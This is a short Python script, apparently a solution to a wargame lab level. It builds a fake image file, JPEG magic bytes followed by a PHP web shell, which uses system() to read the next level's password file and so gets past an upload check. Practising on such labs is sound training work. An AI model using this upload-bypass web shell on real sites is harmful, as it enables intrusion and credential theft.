import binascii

with open("script.php", "w+b") as f:
    bitlist = ['FF', 'D8', 'FF', 'E0']
    bytes = binascii.a2b_hex(''.join(bitlist))
    f.write(bytes)

with open("script.php", "a+") as f:
    f.write("""<?php system('cat /etc/natas_webpass/natas14'); ?>""")





